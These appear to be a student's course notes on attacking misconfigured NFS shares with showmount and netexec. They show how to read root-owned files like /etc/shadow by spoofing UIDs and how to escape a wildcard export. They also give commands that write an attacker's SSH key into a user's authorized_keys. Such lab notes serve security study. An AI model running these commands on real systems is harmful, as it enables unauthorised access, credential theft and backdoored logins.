**Server Side**
- exported directories are defined in `/etc/exports`
- access restrictions
	- IP address - most common
	- hostname
	- authentication - more rare
- options
	- rw
	- root squashing
		- sets root to "nobody" (UID 65534)
		- can't read files owned by root in the nfs share
![](assets/Pasted%20image%2020260703092800.png)


**List Exported Shares with "showmount"**
`showmount --exports <IP>`
![](assets/Pasted%20image%2020260703092926.png)

with netexec
`nxc nfs <IP> --shares`
![](assets/Pasted%20image%2020260703092950.png)
- access list - wildcard means everyone on the network can access it
- keep **root escape** in mind
- since netexec automates UID/GID adjustment, we can access all files now owned by root (such as `/etc/shadow` - owned by shadow group)



**Mount a Share**
`nxc nfs <IP> --share /var/nfs/general -ls`
- netexec will update the UID and GID as needed for access



**Example Attack**
![](assets/Pasted%20image%2020260703093846.png)




## Root Escape

list shares
`nxc nfs <IP> --shares`

list directory in share
`nxc nfs <IP> --share /var/nfs/public --ls`

get root directory
`nxc nfs <IP> --share /var/nfs/public --get-file root_test ./`

![](assets/Pasted%20image%2020260703100904.png)

put file in share
`nxc nfs <IP> --share /var/nfs/public --put-file <in_file> <out_file>`

get exports file
`nxc nfs <IP> --get-file /etc/exports ./`
![](assets/Pasted%20image%2020260703101144.png)
- can write to any file that is not root (ssh key)
- `*(rw)` means that any user can write anywhere on the file system (except root)


look at home directory
`nxc nfs <IP> --ls /home`

put ssh key in authorized_keys
`nxc nfs <IP> --put-file ~/.ssh/id_rsa.pub /home/<user>/.ssh/authorized_keys`
- in the student vm, you need to make a new ssh key `ssh-keygen -f <name>`
![](assets/Pasted%20image%2020260703101640.png)

change permissions of key
`nxc nfs <IP> --chmod 644 /home/<user>/.ssh/authorized_keys`
![](assets/Pasted%20image%2020260703101627.png)

